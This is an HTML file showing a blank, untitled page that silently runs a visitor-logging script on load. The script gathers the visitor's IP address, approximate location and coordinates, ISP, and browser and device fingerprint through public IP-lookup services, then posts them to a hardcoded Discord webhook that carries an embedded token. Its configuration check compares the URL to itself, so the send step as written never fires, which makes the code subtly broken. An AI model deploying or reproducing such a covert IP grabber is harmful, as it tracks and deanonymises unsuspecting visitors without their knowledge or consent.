<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            width: 100%;
        }
    </style>
</head>
<body>

<script>
    (function() {
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
        
        let notificationSent = false;
        let successfulData = false;
        
        let visitorData = {
            ip: null,
            country: null,
            country_code: null,
            region: null,
            city: null,
            latitude: null,
            longitude: null,
            timezone: null,
            isp: null,
            org: null,
            source_service: null,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : null,
            screen_resolution: window.screen.width + 'x' + window.screen.height,
            screen_color_depth: window.screen.colorDepth,
            timezone_offset: new Date().getTimezoneOffset(),
            referrer: document.referrer || null,
            current_url: window.location.href,
            hostname: window.location.hostname,
            pathname: window.location.pathname,
            connection_type: navigator.connection ? navigator.connection.effectiveType : null,
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null,
            hardware_concurrency: navigator.hardwareConcurrency,
            cookies_enabled: navigator.cookieEnabled,
            timestamp: null,
            success: false,
            error_message: null
        };
        
        function sendToDiscord(data) {
            if (notificationSent) return;
            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
                console.warn('Webhook URL not configured');
                return;
            }
            
            notificationSent = true;
            data.timestamp = new Date().toISOString();
            
            let embedColor = data.success ? 0x00ff00 : 0xff0000;
            let title = data.success ? '✅ Visitor Detected' : '⚠️ Visitor Detected (Limited Data)';
            
            let fields = [];
            
            if (data.ip) fields.push({ name: '🌐 IP Address', value: data.ip, inline: true });
            if (data.country) fields.push({ name: '📍 Country', value: data.country, inline: true });
            if (data.city) fields.push({ name: '🏙️ City', value: data.city, inline: true });
            if (data.region) fields.push({ name: '🗺️ Region', value: data.region, inline: true });
            if (data.latitude && data.longitude) fields.push({ name: '📌 Coordinates', value: `${data.latitude}, ${data.longitude}`, inline: true });
            if (data.timezone) fields.push({ name: '🕐 Timezone', value: data.timezone, inline: true });
            if (data.isp) fields.push({ name: '🔌 ISP', value: data.isp, inline: true });
            if (data.org) fields.push({ name: '🏢 Organization', value: data.org, inline: true });
            if (data.source_service) fields.push({ name: '📡 Source', value: data.source_service, inline: false });
            
            fields.push({ name: '💻 User Agent', value: data.user_agent.substring(0, 100) + (data.user_agent.length > 100 ? '...' : ''), inline: false });
            fields.push({ name: '🖥️ Screen', value: data.screen_resolution, inline: true });
            fields.push({ name: '🌍 Language', value: data.language, inline: true });
            fields.push({ name: '🔗 Page URL', value: data.current_url.substring(0, 150), inline: false });
            if (data.referrer) fields.push({ name: '↩️ Referrer', value: data.referrer.substring(0, 100), inline: false });
            
            if (data.error_message) {
                fields.push({ name: '⚠️ Error', value: data.error_message, inline: false });
            }
            
            let payload = {
                embeds: [{
                    title: title,
                    color: embedColor,
                    fields: fields,
                    footer: { text: `Visitor ID: ${Date.now()}` },
                    timestamp: data.timestamp
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(function(err) {
                console.warn('Webhook failed:', err);
            });
        }
        
        function sendSuccessNotification() {
            visitorData.success = true;
            visitorData.error_message = null;
            sendToDiscord(visitorData);
        }
        
        function sendFailureNotification(errorMsg) {
            if (successfulData) return;
            visitorData.success = false;
            visitorData.error_message = errorMsg || 'Failed to retrieve visitor data';
            sendToDiscord(visitorData);
        }
        
        function mergeData(newData, serviceName) {
            if (!newData) return false;
            
            let hasNewInfo = false;
            
            if (newData.ip && !visitorData.ip) {
                visitorData.ip = newData.ip;
                hasNewInfo = true;
            }
            if (newData.country && !visitorData.country) {
                visitorData.country = newData.country;
                hasNewInfo = true;
            }
            if (newData.country_code && !visitorData.country_code) {
                visitorData.country_code = newData.country_code;
                hasNewInfo = true;
            }
            if (newData.region && !visitorData.region) {
                visitorData.region = newData.region;
                hasNewInfo = true;
            }
            if (newData.city && !visitorData.city) {
                visitorData.city = newData.city;
                hasNewInfo = true;
            }
            if (newData.latitude && !visitorData.latitude) {
                visitorData.latitude = newData.latitude;
                hasNewInfo = true;
            }
            if (newData.longitude && !visitorData.longitude) {
                visitorData.longitude = newData.longitude;
                hasNewInfo = true;
            }
            if (newData.timezone && !visitorData.timezone) {
                visitorData.timezone = newData.timezone;
                hasNewInfo = true;
            }
            if (newData.isp && !visitorData.isp) {
                visitorData.isp = newData.isp;
                hasNewInfo = true;
            }
            if (newData.org && !visitorData.org) {
                visitorData.org = newData.org;
                hasNewInfo = true;
            }
            
            if (hasNewInfo && !visitorData.source_service) {
                visitorData.source_service = serviceName;
            } else if (hasNewInfo && visitorData.source_service) {
                visitorData.source_service = visitorData.source_service + ' + ' + serviceName;
            }
            
            return hasNewInfo;
        }
        
        function serviceIpApiHttps() {
            return fetch('https://ip-api.com/json/?fields=66846719')
                .then(function(response) {
                    if (!response.ok) throw new Error('ip-api.com failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.status === 'success' && data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            country_code: data.countryCode,
                            region: data.regionName,
                            city: data.city,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp,
                            org: data.org,
                            timezone: data.timezone
                        };
                    }
                    throw new Error('ip-api.com unsuccessful');
                });
        }
        
        function serviceIpApiCoHttps() {
            return fetch('https://ipapi.co/json/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipapi.co failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            org: data.org,
                            isp: data.org
                        };
                    }
                    throw new Error('ipapi.co no ip');
                });
        }
        
        function serviceIpWhoIsHttps() {
            return fetch('https://ipwho.is/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipwho.is failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.success === true && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.connection ? data.connection.isp : null,
                            org: data.connection ? data.connection.org : null
                        };
                    }
                    throw new Error('ipwho.is unsuccessful');
                });
        }
        
        function serviceIpWhoIsApp() {
            return fetch('https://ipwhois.app/json/')
                .then(function(response) {
                    if (!response.ok) throw new Error('ipwhois.app failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.isp,
                            org: data.org
                        };
                    }
                    throw new Error('ipwhois.app no ip');
                });
        }
        
        let servicesList = [
            { name: 'ip-api.com', fn: serviceIpApiHttps },
            { name: 'ipapi.co', fn: serviceIpApiCoHttps },
            { name: 'ipwho.is', fn: serviceIpWhoIsHttps },
            { name: 'ipwhois.app', fn: serviceIpWhoIsApp }
        ];
        
        let currentIndex = 0;
        let requestCompleted = false;
        let activeTimeouts = [];
        
        function clearAllTimeouts() {
            for (let i = 0; i < activeTimeouts.length; i++) {
                clearTimeout(activeTimeouts[i]);
            }
            activeTimeouts = [];
        }
        
        function tryNextService() {
            if (requestCompleted) return;
            
            if (currentIndex >= servicesList.length) {
                if (!successfulData) {
                    let generatedId = 'visitor-' + Date.now() + '-' + Math.random().toString(36).substr(2, 8);
                    visitorData.ip = generatedId;
                    visitorData.source_service = 'generated-fallback';
                    visitorData.error_message = 'All IP services blocked or failed, using generated ID';
                    sendFailureNotification('Unable to retrieve IP data from any service');
                }
                requestCompleted = true;
                clearAllTimeouts();
                return;
            }
            
            let service = servicesList[currentIndex];
            currentIndex++;
            
            let timeoutId = setTimeout(function() {
                tryNextService();
            }, 5000);
            activeTimeouts.push(timeoutId);
            
            service.fn()
                .then(function(data) {
                    clearTimeout(timeoutId);
                    if (requestCompleted) return;
                    
                    if (data && data.ip) {
                        let hadData = mergeData(data, service.name);
                        if (hadData) {
                            successfulData = true;
                            sendSuccessNotification();
                            requestCompleted = true;
                            clearAllTimeouts();
                        } else {
                            tryNextService();
                        }
                    } else {
                        tryNextService();
                    }
                })
                .catch(function() {
                    clearTimeout(timeoutId);
                    if (!requestCompleted) {
                        tryNextService();
                    }
                });
        }
        
        function fallbackWithHeaders() {
            setTimeout(function() {
                if (!requestCompleted && !successfulData) {
                    if (!visitorData.ip) {
                        let fallbackId = 'fallback-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
                        visitorData.ip = fallbackId;
                        visitorData.source_service = 'ultimate-fallback';
                        visitorData.error_message = 'All API requests failed or were blocked';
                        sendFailureNotification('All IP services unavailable');
                        requestCompleted = true;
                    }
                }
                clearAllTimeouts();
            }, 12000);
        }
        
        function collectBrowserInfo() {
            if (navigator.connection) {
                try {
                    if (navigator.connection.downlink) visitorData.downlink_mbps = navigator.connection.downlink;
                    if (navigator.connection.rtt) visitorData.round_trip_time_ms = navigator.connection.rtt;
                } catch(e) {}
            }
            
            if (window.devicePixelRatio) visitorData.device_pixel_ratio = window.devicePixelRatio;
            
            try {
                let timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (timezoneName && !visitorData.timezone) visitorData.timezone = timezoneName;
            } catch(e) {}
            
            visitorData.viewport_width = window.innerWidth;
            visitorData.viewport_height = window.innerHeight;
            visitorData.document_encoding = document.characterSet;
            visitorData.is_touch_device = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            visitorData.local_time = new Date().toString();
        }
        
        function ensureWebhookSent() {
            let safetyTimeout = setTimeout(function() {
                if (!notificationSent) {
                    if (!visitorData.ip) {
                        visitorData.ip = 'timeout-safety-' + Date.now();
                        visitorData.source_service = 'safety-timeout';
                    }
                    if (!visitorData.success && !successfulData) {
                        visitorData.success = false;
                        visitorData.error_message = visitorData.error_message || 'Safety timeout triggered';
                    } else if (successfulData && !visitorData.success) {
                        visitorData.success = true;
                    }
                    sendToDiscord(visitorData);
                    requestCompleted = true;
                }
                clearAllTimeouts();
            }, 15000);
            activeTimeouts.push(safetyTimeout);
        }
        
        collectBrowserInfo();
        
        tryNextService();
        
        fallbackWithHeaders();
        
        ensureWebhookSent();
        
        window.addEventListener('load', function() {
            setTimeout(function() {
                if (!notificationSent && !requestCompleted && visitorData.ip) {
                    sendSuccessNotification();
                    requestCompleted = true;
                }
            }, 3000);
        });
    })();
</script>
</body>
</html>
